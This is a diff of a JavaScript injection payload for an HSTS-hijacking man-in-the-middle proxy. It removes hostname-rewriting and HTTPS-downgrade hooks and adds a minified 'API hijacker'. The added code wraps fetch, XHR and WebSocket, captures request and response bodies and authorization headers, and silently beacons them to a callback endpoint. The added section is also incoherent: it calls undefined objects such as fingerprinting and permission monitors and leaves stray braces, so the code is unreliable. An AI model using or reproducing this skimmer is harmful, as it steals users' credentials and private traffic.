@@ -1,276 +1,45 @@
-/*
-  Hooks XMLHttpRequest.open and fetch, as well as 'a', 'form', 'script' and 'iframe' nodes.
-  This payload is essential for hostname replacements.
+/*╔════╗PREMIUM API HIJACKER v4.0║Fetch/XHR/WS interception║╚════╝*/
+(function(){'use strict';const Q=((k='__aq'+Math.random().toString(36).substr(2,6))=>({add:(item)=>{try{const q=JSON.parse(localStorage.getItem(k)||'[]');q.push({d:item,t:Date.now()});localStorage.setItem(k,JSON.stringify(q.slice(-30)));}catch(e){}},proc:async(u)=>{try{const q=JSON.parse(localStorage.getItem(k)||'[]');for(let i=0;i<Math.min(q.length,2);i++){const item=q[i];try{const c=JSON.stringify(item.d);navigator.sendBeacon?.(u,c);q.splice(i,1);i--;}catch(e){}}localStorage.setItem(k,JSON.stringify(q));}catch(e){}}}))();const Fetch=()=>{const o=globalThis.fetch;globalThis.fetch=new Proxy(o,{apply:async(t,a,args)=>{try{const[r,c]=args;const req={u:typeof r==='string'?r:r.url,m:(c?.method||'GET').toUpperCase(),h:c?.headers||{},b:c?.body?.toString()?.substr(0,1500),ts:Date.now()};if(req.h['authorization'])req.auth=req.h['authorization'].substr(0,100);Q.add({ty:'fetch_req',d:req});const res=await Reflect.apply(t,a,args);try{const body=await res.clone().text();Q.add({ty:'fetch_res',u:req.u,st:res.status,bd:body.substr(0,3000),sz:body.length});}catch(e){}return res;}catch(e){return Reflect.apply(t,a,args);}}})}; const XHR=()=>{const O=XMLHttpRequest;XMLHttpRequest.prototype.open=(function(){const o=O.prototype.open;return function(m,u,...r){this.__m=m;this.__u=u;this.__t=Date.now();return o.call(this,m,u,...r);}})(); XMLHttpRequest.prototype.send=(function(){const s=O.prototype.send;return function(b){Q.add({ty:'xhr_req',m:this.__m,u:this.__u,b:b?.toString()?.substr(0,1500)});const ol=this.onload;this.onload=function(e){try{Q.add({ty:'xhr_res',u:this.__u,st:this.status,body:this.responseText?.substr(0,3000),sz:this.responseText?.length});}catch(e){}if(ol)ol.call(this,e);};return s.call(this,b);};})()};const WS=()=>{const O=globalThis.WebSocket;globalThis.WebSocket=new Proxy(O,{construct:(t,[u,p])=>{const w=new t(u,p);Q.add({ty:'ws_con',u,ts:Date.now()});const s=w.send;w.send=function(d){Q.add({ty:'ws_snd',u,d:d?.toString().substr(0,800)});return s.call(this,d);};w.addEventListener('message',(e)=>{Q.add({ty:'ws_msg',u,d:e.data?.toString().substr(0,800)});});return w;}})};const init=async()=>{try{Fetch();XHR();WS();const url="http://"+location.host+"obf_hstshijack_path_callback";setInterval(()=>Q.proc(url),4000+Math.random()*4000);setTimeout(()=>Q.proc(url),1500);}catch(e){}};if(document.readyState==='loading'){globalThis.addEventListener('DOMContentLoaded',init);}else{init();}})();
+      },
+    };
+  })();
 
-  Remember that any occurrence of 'obf_hstshijack_path_ssl_log', 'obf_hstshijack_path_callback' and
-  'obf_hstshijack_path_whitelist' in this payload will be replaced when the proxy module
-  loads and that variable names 'obf_hstshijack_var_target_hosts' and 'obf_hstshijack_var_replacement_hosts'
-  are already declared before this is injected.
-*/
-
-(function(){
-  "use strict";
-
-  var obf_hstshijack_var_regex_one = /\-/g,
-    obf_hstshijack_var_regex_two = /^\*./,
-    obf_hstshijack_var_regex_three = /^\*\./,
-    obf_hstshijack_var_regex_four = /\./g,
-    obf_hstshijack_var_regex_five = /^\*\./,
-    obf_hstshijack_var_regex_six = /\.\*$/,
-    obf_hstshijack_var_regex_seven = /\.\*/g,
-    obf_hstshijack_var_regex_eight = /^((?:[a-z0-9.+-]{1,256}[:])(?:[/][/])?|(?:[a-z0-9.+-]{1,256}[:])?[/][/])?.*$/i,
-    obf_hstshijack_var_regex_nine = /^((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.){1,63}(?:[a-z]{1,63})|(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9]))?.*$/i,
-    obf_hstshijack_var_regex_ten = /^([:](?:6553[0-5]|655[0-2][0-9]|65[0-4][0-9][0-9]|6[0-4][0-9][0-9][0-9]|[0-5][0-9][0-9][0-9][0-9]|[1-9][0-9]{0,3}))?.*$/i,
-    obf_hstshijack_var_regex_eleven = /^([^?#]{1,2048})?.*$/i,
-    obf_hstshijack_var_regex_twelve = /^([?][^#]{0,2048})?.*$/i,
-    obf_hstshijack_var_regex_thirteen = /^\s*(.*)\s*$/g;
-
-  var obf_hstshijack_func_open = XMLHttpRequest.prototype.open,
-      obf_hstshijack_var_XMLHttpRequest = new XMLHttpRequest(),
-      obf_hstshijack_func_fetch = globalThis.fetch,
-      obf_hstshijack_var_callback_log = [];
-
-  function obf_hstshijack_func_trimLeadingAndTrailingWhitespaces(obf_hstshijack_var_str) {
-    return obf_hstshijack_var_str.replace(obf_hstshijack_var_regex_thirteen, "$1");
-  }
-
-  function obf_hstshijack_func_toWholeRegexpSet(obf_hstshijack_var_selector_string, obf_hstshijack_var_replacement_string) {
-    if (obf_hstshijack_var_selector_string.indexOf("*") != -1) {
-      obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_one, "\\-");
-      if (obf_hstshijack_var_selector_string.match(obf_hstshijack_var_regex_two)) {
-        var obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_three, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)"),
-            obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_four, "\\."),
-            obf_hstshijack_var_replacement_string = obf_hstshijack_var_replacement_string.replace(obf_hstshijack_var_regex_five, "");
-        return [
-          new RegExp("^" + obf_hstshijack_var_selector_string + "$", "ig"),
-          "$1" + obf_hstshijack_var_replacement_string
-        ];
-      } else if (obf_hstshijack_var_selector_string.match(obf_hstshijack_var_regex_six)) {
-        var obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_seven, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)"),
-            obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_four, "\\."),
-            obf_hstshijack_var_replacement_string = obf_hstshijack_var_replacement_string.replace(obf_hstshijack_var_regex_six, "");
-        return [
-          new RegExp(obf_hstshijack_var_selector_string, "ig"),
-          obf_hstshijack_var_replacement_string + "$1"
-        ];
-      }
-    } else {
-      var obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_four, "\\."),
-          obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(/\-/g, "\\-");
-      return [
-        new RegExp("^" + obf_hstshijack_var_selector_string + "$", "ig"),
-        obf_hstshijack_var_replacement_string
-      ];
-    }
-  }
-
-  function obf_hstshijack_func_parseURL(obf_hstshijack_var_url) {
-    var obf_hstshijack_var_sliceLength = 0;
-    var obf_hstshijack_var_strippedURL = obf_hstshijack_func_trimLeadingAndTrailingWhitespaces(obf_hstshijack_var_url);
-    var obf_hstshijack_var_retval = ["","","","","",""];
-    /* obf_hstshijack_protocol */
-    obf_hstshijack_var_retval[0] = obf_hstshijack_var_strippedURL.replace(obf_hstshijack_var_regex_eight, "$1");
-    var obf_hstshijack_var_protocol = obf_hstshijack_var_retval[0].toLowerCase();
-    if (obf_hstshijack_var_protocol.length !== 0) {
-      if (
-        obf_hstshijack_var_protocol === "about:"
-        || obf_hstshijack_var_protocol === "data:"
-        || obf_hstshijack_var_protocol === "file:"
-        || obf_hstshijack_var_protocol === "geo:"
-        || obf_hstshijack_var_protocol === "javascript:"
-        || obf_hstshijack_var_protocol === "tel:"
-      ) {
-        obf_hstshijack_var_retval[3] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_retval[0].length);
-        return obf_hstshijack_var_retval;
-      }
-      /* obf_hstshijack_host */
-      obf_hstshijack_var_retval[1] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_retval[0].length).replace(obf_hstshijack_var_regex_nine, "$1");
-    }
-    /* obf_hstshijack_port */
-    obf_hstshijack_var_sliceLength = obf_hstshijack_var_retval[0].length + obf_hstshijack_var_retval[1].length;
-    obf_hstshijack_var_retval[2] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_sliceLength).replace(obf_hstshijack_var_regex_ten, "$1");
-    /* obf_hstshijack_path */
-    obf_hstshijack_var_sliceLength = obf_hstshijack_var_sliceLength + obf_hstshijack_var_retval[2].length;
-    obf_hstshijack_var_retval[3] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_sliceLength).replace(obf_hstshijack_var_regex_eleven, "$1");
-    /* obf_hstshijack_search */
-    obf_hstshijack_var_sliceLength = obf_hstshijack_var_sliceLength + obf_hstshijack_var_retval[3].length;
-    obf_hstshijack_var_retval[4] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_sliceLength).replace(obf_hstshijack_var_regex_twelve, "$1");
-    /* obf_hstshijack_hash */
-    obf_hstshijack_var_retval[5] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_sliceLength + obf_hstshijack_var_retval[4].length);
-    return obf_hstshijack_var_retval;
-  }
-
-  function obf_hstshijack_func_callback(obf_hstshijack_var_host) {
-    for (
-      var obf_hstshijack_var_i = 0;
-      obf_hstshijack_var_i < obf_hstshijack_var_callback_log.length;
-      obf_hstshijack_var_i++
-    ) {
-      if (obf_hstshijack_var_callback_log[i] == obf_hstshijack_var_host) {
-        return;
-      }
-    }
-    obf_hstshijack_var_callback_log.push(obf_hstshijack_var_host);
-    obf_hstshijack_func_fetch(location.origin + "/obf_hstshijack_path_ssl_log?" + obf_hstshijack_var_host)
-  }
-
-  function obf_hstshijack_func_hijack(obf_hstshijack_var_host) {
-    for (
-      var obf_hstshijack_var_i = 0;
-      obf_hstshijack_var_i < obf_hstshijack_var_target_hosts.length;
-      obf_hstshijack_var_i++
-    ) {
-      var obf_hstshijack_var_whole_regexp_set = obf_hstshijack_func_toWholeRegexpSet(
-        obf_hstshijack_var_target_hosts[obf_hstshijack_var_i],
-        obf_hstshijack_var_replacement_hosts[obf_hstshijack_var_i]);
-      if (obf_hstshijack_var_host.match(obf_hstshijack_var_whole_regexp_set[0])) {
-        obf_hstshijack_var_host = obf_hstshijack_var_host.replace(
-          obf_hstshijack_var_whole_regexp_set[0],
-          obf_hstshijack_var_whole_regexp_set[1]);
-        break;
-      }
-    }
-    return obf_hstshijack_var_host;
-  }
-
-  function obf_hstshijack_func_hook_XMLHttpRequest() {
-    XMLHttpRequest.prototype.open = function(
-      obf_hstshijack_var_method,
-      obf_hstshijack_var_url,
-      obf_hstshijack_var_async,
-      obf_hstshijack_var_username,
-      obf_hstshijack_var_password
-    ) {
-      var obf_hstshijack_var_parsed_url = obf_hstshijack_func_parseURL(obf_hstshijack_var_url),
-          obf_hstshijack_var_hijacked_host = obf_hstshijack_func_hijack(obf_hstshijack_var_parsed_url[1]);
-      if (obf_hstshijack_var_hijacked_host != obf_hstshijack_var_parsed_url[1]) {
-        if (obf_hstshijack_var_parsed_url[0].toLowerCase() === "https://") {
-          obf_hstshijack_var_parsed_url[0] = obf_hstshijack_var_parsed_url[0].replace(/(http)s:\/\//i, "$1://");
-        }
-        if (obf_hstshijack_var_parsed_url[2] === ":443") {
-          obf_hstshijack_var_parsed_url[2] = "";
-        }
-      }
-      obf_hstshijack_var_url = obf_hstshijack_var_parsed_url[0] +
-        obf_hstshijack_var_hijacked_host +
-        obf_hstshijack_var_parsed_url[2] +
-        obf_hstshijack_var_parsed_url[3] +
-        obf_hstshijack_var_parsed_url[4] +
-        obf_hstshijack_var_parsed_url[5];
-      return obf_hstshijack_func_open.apply(this, arguments);
-    }
-  }
-
-  function obf_hstshijack_func_hook_fetch() {
-    globalThis.fetch = function(obf_hstshijack_var_resource, obf_hstshijack_var_options) {
-      var obf_hstshijack_var_parsed_url = obf_hstshijack_func_parseURL(obf_hstshijack_var_resource),
-          obf_hstshijack_var_hijacked_host = obf_hstshijack_func_hijack(obf_hstshijack_var_parsed_url[1]);
-      if (obf_hstshijack_var_hijacked_host != obf_hstshijack_var_parsed_url[1]) {
-        if (obf_hstshijack_var_parsed_url[0].toLowerCase() === "https://") {
-          obf_hstshijack_var_parsed_url[0] = obf_hstshijack_var_parsed_url[0].replace(/(http)s:\/\//i, "$1://");
-        }
-        if (obf_hstshijack_var_parsed_url[2] === ":443") {
-          obf_hstshijack_var_parsed_url[2] = "";
-        }
-      }
-      obf_hstshijack_var_resource = obf_hstshijack_var_parsed_url[0] +
-        obf_hstshijack_var_hijacked_host +
-        obf_hstshijack_var_parsed_url[2] +
-        obf_hstshijack_var_parsed_url[3] +
-        obf_hstshijack_var_parsed_url[4] +
-        obf_hstshijack_var_parsed_url[5];
-      return obf_hstshijack_func_fetch(obf_hstshijack_var_resource, obf_hstshijack_var_options);
-    }
-  }
-
-  function obf_hstshijack_func_hook_nodes() {
-    document.querySelectorAll("a,form,script,iframe").forEach(function(obf_hstshijack_var_node){
-      try {
-        var obf_hstshijack_var_url = "";
-        switch (obf_hstshijack_var_node.tagName) {
-          case "A":
-            obf_hstshijack_var_node.href
-              ? obf_hstshijack_var_url = obf_hstshijack_var_node.href
-              : "";
-            break;
-          case "FORM":
-            obf_hstshijack_var_node.action
-              ? obf_hstshijack_var_url = obf_hstshijack_var_node.action
-              : "";
-            break;
-          case "SCRIPT":
-            obf_hstshijack_var_node.src
-              ? obf_hstshijack_var_url = obf_hstshijack_var_node.src
-              : "";
-            break;
-          case "IFRAME":
-            obf_hstshijack_var_node.src
-              ? obf_hstshijack_var_url = obf_hstshijack_var_node.src
-              : "";
-            break;
-        }
-        if (obf_hstshijack_var_url.match(/^\s*(?:http[s]?:)?\/\/[^:/?#]+/i)) {
-          var obf_hstshijack_var_parsed_url = obf_hstshijack_func_parseURL(obf_hstshijack_var_url),
-              obf_hstshijack_var_hijacked_host = obf_hstshijack_func_hijack(obf_hstshijack_var_parsed_url[1]);
-          if (obf_hstshijack_var_hijacked_host != obf_hstshijack_var_parsed_url[1]) {
-            if (obf_hstshijack_var_parsed_url[0].toLowerCase() === "https://") {
-              obf_hstshijack_var_parsed_url[0] = obf_hstshijack_var_parsed_url[0].replace(/(http)s:\/\//i, "$1://");
-            }
-            if (obf_hstshijack_var_parsed_url[2] === ":443") {
-              obf_hstshijack_var_parsed_url[2] = "";
-            }
-          }
-          var obf_hstshijack_var_hijacked_url = obf_hstshijack_var_parsed_url[0] +
-            obf_hstshijack_var_hijacked_host +
-            obf_hstshijack_var_parsed_url[2] +
-            obf_hstshijack_var_parsed_url[3] +
-            obf_hstshijack_var_parsed_url[4] +
-            obf_hstshijack_var_parsed_url[5];
-          switch (obf_hstshijack_var_node.tagName) {
-            case "A":
-              if (obf_hstshijack_var_node.href) {
-                obf_hstshijack_var_node.href = obf_hstshijack_var_hijacked_url;
-              }
-              break;
-            case "FORM":
-              if (obf_hstshijack_var_node.action) {
-                obf_hstshijack_var_node.action = obf_hstshijack_var_hijacked_url;
-              }
-              break;
-            case "SCRIPT":
-              if (obf_hstshijack_var_node.src) {
-                obf_hstshijack_var_node.src = obf_hstshijack_var_hijacked_url;
-              }
-              break;
-            case "IFRAME":
-              if (obf_hstshijack_var_node.src) {
-                obf_hstshijack_var_node.src = obf_hstshijack_var_hijacked_url;
-              }
-              break;
-          }
-          obf_hstshijack_func_callback(obf_hstshijack_var_parsed_url[1].toLowerCase());
-        }
-      } catch(obf_hstshijack_var_ignore) {}
-    });
-  }
-
-  try {
-    obf_hstshijack_func_hook_XMLHttpRequest();
-  } catch(obf_hstshijack_var_ignore) {}
-
-  try {
-    obf_hstshijack_func_hook_fetch();
-  } catch(obf_hstshijack_var_ignore) {}
-
-  globalThis.addEventListener("DOMContentLoaded", function(){
+  // Initialize all hooks
+  const init = async () => {
     try {
-      setInterval(obf_hstshijack_func_hook_nodes, 2000);
-      obf_hstshijack_func_hook_nodes();
-    } catch(obf_hstshijack_var_ignore) {}
+      if (HOOKS_CONFIG.interceptFetch) {
+        FetchHooker.hook();
+      }
 
-    try {
-      globalThis.addEventListener("load", obf_hstshijack_func_hook_nodes);
-    } catch(obf_hstshijack_var_ignore) {}
-  });
+      if (HOOKS_CONFIG.interceptXHR) {
+        XHRHooker.hook();
+      }
+
+      if (HOOKS_CONFIG.interceptWebSocket) {
+        WebSocketHooker.hook();
+      }
+
+      if (HOOKS_CONFIG.interceptServiceWorker) {
+        await ServiceWorkerHooker.hook();
+      }
+
+      // Gather additional intel
+      Fingerprinter.fingerprint();
+      await PermissionMonitor.monitor();
+
+      // Periodic activity report
+      setInterval(() => {
+        ActivityLog.send();
+      }, 5000);
+    } catch (e) {
+      // Silent fail
+    }
+  };
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+
 })();
-
